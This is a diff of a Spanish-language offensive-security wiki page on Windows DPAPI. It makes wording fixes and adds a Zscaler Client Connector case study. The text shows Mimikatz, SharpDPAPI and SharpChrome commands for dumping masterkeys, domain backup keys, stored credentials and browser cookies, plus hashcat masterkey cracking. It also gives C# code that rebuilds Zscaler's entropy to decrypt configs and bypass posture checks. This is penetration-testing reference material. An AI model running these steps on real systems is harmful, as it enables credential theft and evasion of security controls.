@@ -6,11 +6,11 @@
 
 ## ¿Qué es DPAPI?
 
-La API de Protección de Datos (DPAPI) se utiliza principalmente dentro del sistema operativo Windows para la **encriptación simétrica de claves privadas asimétricas**, aprovechando secretos de usuario o del sistema como una fuente significativa de entropía. Este enfoque simplifica la encriptación para los desarrolladores al permitirles encriptar datos utilizando una clave derivada de los secretos de inicio de sesión del usuario o, para la encriptación del sistema, los secretos de autenticación del dominio del sistema, eliminando así la necesidad de que los desarrolladores gestionen la protección de la clave de encriptación ellos mismos.
+La API de Protección de Datos (DPAPI) se utiliza principalmente dentro del sistema operativo Windows para la **cifrado simétrico de claves privadas asimétricas**, aprovechando secretos de usuario o del sistema como una fuente significativa de entropía. Este enfoque simplifica el cifrado para los desarrolladores al permitirles cifrar datos utilizando una clave derivada de los secretos de inicio de sesión del usuario o, para el cifrado del sistema, los secretos de autenticación del dominio del sistema, evitando así que los desarrolladores gestionen la protección de la clave de cifrado ellos mismos.
 
-La forma más común de usar DPAPI es a través de las funciones **`CryptProtectData` y `CryptUnprotectData`**, que permiten a las aplicaciones encriptar y desencriptar datos de manera segura con la sesión del proceso que actualmente ha iniciado sesión. Esto significa que los datos encriptados solo pueden ser desencriptados por el mismo usuario o sistema que los encriptó.
+La forma más común de usar DPAPI es a través de las funciones **`CryptProtectData` y `CryptUnprotectData`**, que permiten a las aplicaciones cifrar y descifrar datos de manera segura con la sesión del proceso que está actualmente conectado. Esto significa que los datos cifrados solo pueden ser descifrados por el mismo usuario o sistema que los cifró.
 
-Además, estas funciones también aceptan un **parámetro `entropy`** que también se utilizará durante la encriptación y desencriptación, por lo tanto, para desencriptar algo encriptado utilizando este parámetro, debes proporcionar el mismo valor de entropía que se utilizó durante la encriptación.
+Además, estas funciones también aceptan un **parámetro `entropy`** que también se utilizará durante el cifrado y descifrado, por lo tanto, para descifrar algo cifrado utilizando este parámetro, debes proporcionar el mismo valor de entropía que se utilizó durante el cifrado.
 
 ### Generación de claves de usuario
 
@@ -18,19 +18,19 @@ DPAPI genera una clave única (llamada **`pre-key`**) para cada usuario basada e
 
 Esto es especialmente interesante porque si un atacante puede obtener el hash de la contraseña del usuario, puede:
 
-- **Desencriptar cualquier dato que fue encriptado usando DPAPI** con la clave de ese usuario sin necesidad de contactar ninguna API.
+- **Descifrar cualquier dato que fue cifrado utilizando DPAPI** con la clave de ese usuario sin necesidad de contactar ninguna API.
 - Intentar **romper la contraseña** fuera de línea tratando de generar la clave DPAPI válida.
 
-Además, cada vez que un usuario encripta datos usando DPAPI, se genera una nueva **clave maestra**. Esta clave maestra es la que se utiliza realmente para encriptar datos. Cada clave maestra se asigna con un **GUID** (Identificador Único Global) que la identifica.
+Además, cada vez que un usuario cifra algún dato utilizando DPAPI, se genera una nueva **clave maestra**. Esta clave maestra es la que se utiliza realmente para cifrar datos. Cada clave maestra se proporciona con un **GUID** (Identificador Único Global) que la identifica.
 
-Las claves maestras se almacenan en el directorio **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, donde `{SID}` es el Identificador de Seguridad de ese usuario. La clave maestra se almacena encriptada por el **`pre-key`** del usuario y también por una **clave de respaldo de dominio** para recuperación (por lo que la misma clave se almacena encriptada 2 veces por 2 contraseñas diferentes).
+Las claves maestras se almacenan en el directorio **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, donde `{SID}` es el Identificador de Seguridad de ese usuario. La clave maestra se almacena cifrada por el **`pre-key`** del usuario y también por una **clave de respaldo de dominio** para recuperación (por lo que la misma clave se almacena cifrada 2 veces por 2 contraseñas diferentes).
 
-Ten en cuenta que la **clave de dominio utilizada para encriptar la clave maestra está en los controladores de dominio y nunca cambia**, por lo que si un atacante tiene acceso al controlador de dominio, puede recuperar la clave de respaldo de dominio y desencriptar las claves maestras de todos los usuarios en el dominio.
+Ten en cuenta que la **clave de dominio utilizada para cifrar la clave maestra está en los controladores de dominio y nunca cambia**, por lo que si un atacante tiene acceso al controlador de dominio, puede recuperar la clave de respaldo de dominio y descifrar las claves maestras de todos los usuarios en el dominio.
 
-Los blobs encriptados contienen el **GUID de la clave maestra** que se utilizó para encriptar los datos dentro de sus encabezados.
+Los blobs cifrados contienen el **GUID de la clave maestra** que se utilizó para cifrar los datos dentro de sus encabezados.
 
 > [!TIP]
-> Los blobs encriptados de DPAPI comienzan con **`01 00 00 00`**
+> Los blobs cifrados por DPAPI comienzan con **`01 00 00 00`**
 
 Encontrar claves maestras:
 ```bash
@@ -87,7 +87,7 @@ SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
 # Mimikatz
 mimikatz sekurlsa::dpapi
 ```
-- Si el usuario tiene privilegios de administrador local, puede acceder al **DPAPI_SYSTEM LSA secret** para descifrar las claves maestras de la máquina:
+- Si el usuario tiene privilegios de administrador local, puede acceder al **secreto LSA de DPAPI_SYSTEM** para descifrar las claves maestras de la máquina:
 ```bash
 # Mimikatz
 lsadump::secrets /system:DPAPI_SYSTEM /export
@@ -100,7 +100,7 @@ dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /password:PASSWORD
 ```
-- Si estás dentro de una sesión como el usuario, es posible pedirle al DC la **clave de respaldo para descifrar las claves maestras usando RPC**. Si eres administrador local y el usuario ha iniciado sesión, podrías **robar su token de sesión** para esto:
+- Si estás dentro de una sesión como el usuario, es posible pedir al DC la **clave de respaldo para descifrar las claves maestras usando RPC**. Si eres administrador local y el usuario ha iniciado sesión, podrías **robar su token de sesión** para esto:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -149,11 +149,11 @@ search /type:file /path:C:\path\to\file
 # Search a blob inside B64 encoded data
 search /type:base64 [/base:<base64 string>]
 ```
-Ten en cuenta que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (del mismo repositorio) se puede utilizar para descifrar datos sensibles como cookies utilizando DPAPI.
+Tenga en cuenta que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (del mismo repositorio) se puede utilizar para descifrar datos sensibles como cookies utilizando DPAPI.
 
 ### Claves de acceso y datos
 
-- **Usa SharpDPAPI** para obtener credenciales de archivos cifrados por DPAPI de la sesión actual:
+- **Use SharpDPAPI** para obtener credenciales de archivos cifrados por DPAPI de la sesión actual:
 ```bash
 # Decrypt user data
 ## Note that 'triage' is like running credentials, vaults, rdg and certificates
@@ -244,7 +244,7 @@ SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
 ```
 ### Cracking masterkeys offline (Hashcat & DPAPISnoop)
 
-Microsoft introdujo un formato de masterkey **contexto 3** a partir de Windows 10 v1607 (2016). `hashcat` v6.2.6 (diciembre de 2023) agregó modos de hash **22100** (DPAPI masterkey v1 contexto), **22101** (contexto 1) y **22102** (contexto 3) que permiten el cracking acelerado por GPU de contraseñas de usuario directamente desde el archivo de masterkey. Por lo tanto, los atacantes pueden realizar ataques de lista de palabras o de fuerza bruta sin interactuar con el sistema objetivo.
+Microsoft introdujo un formato de masterkey **context 3** a partir de Windows 10 v1607 (2016). `hashcat` v6.2.6 (diciembre de 2023) agregó modos de hash **22100** (DPAPI masterkey v1 context), **22101** (context 1) y **22102** (context 3) que permiten el cracking acelerado por GPU de contraseñas de usuario directamente desde el archivo de masterkey. Por lo tanto, los atacantes pueden realizar ataques de lista de palabras o de fuerza bruta sin interactuar con el sistema objetivo.
 
 `DPAPISnoop` (2024) automatiza el proceso:
 ```bash
@@ -276,14 +276,13 @@ SharpChrome cookies /server:HOST /pvk:BASE64
 [**DonPAPI**](https://github.com/login-securite/DonPAPI) puede volcar secretos protegidos por DPAPI automáticamente. La versión 2.x introdujo:
 
 * Colección paralela de blobs desde cientos de hosts
-* Análisis de **context 3** masterkeys e integración automática de cracking con Hashcat
+* Análisis de **contexto 3** masterkeys e integración automática de cracking con Hashcat
 * Soporte para cookies encriptadas "App-Bound" de Chrome (ver la siguiente sección)
 * Un nuevo modo **`--snapshot`** para sondear repetidamente los puntos finales y diferenciar blobs recién creados
 
 ### DPAPISnoop
 
-[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) es un analizador en C# para archivos de masterkey/credential/vault que puede generar formatos de Hashcat/JtR y opcionalmente invocar el cracking automáticamente. Soporta completamente los formatos de masterkey de máquina y usuario hasta Windows 11 24H1.
-
+[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) es un analizador en C# para archivos de masterkey/credential/vault que puede generar formatos de Hashcat/JtR y, opcionalmente, invocar el cracking automáticamente. Soporta completamente los formatos de masterkey de máquina y usuario hasta Windows 11 24H1.
 
 ## Detecciones comunes
 
@@ -297,10 +296,45 @@ SharpChrome cookies /server:HOST /pvk:BASE64
 ### Vulnerabilidades y cambios en el ecosistema 2023-2025
 
 * **CVE-2023-36004 – Suplantación de canal seguro de Windows DPAPI** (noviembre de 2023). Un atacante con acceso a la red podría engañar a un miembro del dominio para que recuperara una clave de respaldo de DPAPI maliciosa, permitiendo el descifrado de masterkeys de usuario. Corregido en la actualización acumulativa de noviembre de 2023 – los administradores deben asegurarse de que los DC y estaciones de trabajo estén completamente actualizados.
-* La encriptación de cookies "App-Bound" de **Chrome 127** (julio de 2024) reemplazó la protección heredada solo de DPAPI con una clave adicional almacenada en el **Credential Manager** del usuario. El descifrado fuera de línea de las cookies ahora requiere tanto la masterkey de DPAPI como la **clave de aplicación vinculada envuelta en GCM**. SharpChrome v2.3 y DonPAPI 2.x pueden recuperar la clave adicional cuando se ejecutan con el contexto de usuario.
+* La encriptación de cookies "App-Bound" de **Chrome 127** (julio de 2024) reemplazó la protección heredada solo de DPAPI con una clave adicional almacenada en el **Credential Manager** del usuario. El descifrado fuera de línea de las cookies ahora requiere tanto la masterkey de DPAPI como la **clave app-bound envuelta en GCM**. SharpChrome v2.3 y DonPAPI 2.x pueden recuperar la clave adicional cuando se ejecutan con el contexto del usuario.
 
+### Estudio de caso: Zscaler Client Connector – Entropía personalizada derivada de SID
+
+Zscaler Client Connector almacena varios archivos de configuración en `C:\ProgramData\Zscaler` (por ejemplo, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Cada archivo está encriptado con **DPAPI (alcance de máquina)**, pero el proveedor suministra **entropía personalizada** que se *calcula en tiempo de ejecución* en lugar de almacenarse en disco.
+
+La entropía se reconstruye a partir de dos elementos:
+
+1. Un secreto codificado en el interior de `ZSACredentialProvider.dll`.
+2. El **SID** de la cuenta de Windows a la que pertenece la configuración.
+
+El algoritmo implementado por la DLL es equivalente a:
+```csharp
+byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
+byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);
+
+// XOR the two buffers byte-by-byte
+byte[] tmp = new byte[secret.Length];
+for (int i = 0; i < secret.Length; i++)
+tmp[i] = (byte)(sid[i] ^ secret[i]);
+
+// Split in half and XOR both halves together to create the final entropy buffer
+byte[] entropy = new byte[tmp.Length / 2];
+for (int i = 0; i < entropy.Length; i++)
+entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
+```
+Porque el secreto está incrustado en un DLL que se puede leer desde el disco, **cualquier atacante local con derechos de SYSTEM puede regenerar la entropía para cualquier SID** y descifrar los blobs sin conexión:
+```csharp
+byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
+byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
+Console.WriteLine(Encoding.UTF8.GetString(clear));
+```
+La decripción produce la configuración JSON completa, incluyendo cada **verificación de postura del dispositivo** y su valor esperado, información que es muy valiosa al intentar eludir controles del lado del cliente.
+
+> CONSEJO: los otros artefactos cifrados (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) están protegidos con DPAPI **sin** entropía (`16` bytes cero). Por lo tanto, pueden ser descifrados directamente con `ProtectedData.Unprotect` una vez que se obtienen privilegios de SYSTEM.
 
 ## Referencias
+
+- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
 - [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
 - [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
